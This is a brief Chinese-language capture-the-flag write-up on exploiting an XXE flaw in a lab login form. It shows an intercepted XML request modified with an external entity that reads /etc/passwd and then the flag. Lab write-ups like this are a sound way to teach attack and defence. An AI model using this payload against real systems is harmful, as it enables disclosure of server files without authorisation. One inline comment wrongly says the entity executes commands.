**启动靶机，访问目标地址：**
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251015164932610.png)

**随便输入用户名密码并点击登陆，然后再抓包，可以看到post数据部分是xml格式**
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251015165132457.png)

![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251015165300166.png)

**构造xxe payload:**
将
```c
<?xml version="1.0" encoding="UTF-8"?><root> <username>admin</username> <password>123</password> </root>
```
也就是
```c
<?xml version="1.0" encoding="UTF-8"?>
<root> 
<username>
admin
</username> 
<password>
123
</password> 
</root>
```
修改为：
```c
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY auok SYSTEM "file:///etc/passwd"> ]> // 新添加的xml实体
<root> 
<username>
&auok; //将admin替换为  `&auok;`用以调用xml实体以执行命令
</username> 
<password>
123
</password> 
</root>
```
**可以看到成功读取/etc/passwd文件**
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251015165941160.png)

**接下来读取flag**
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251015170021608.png)
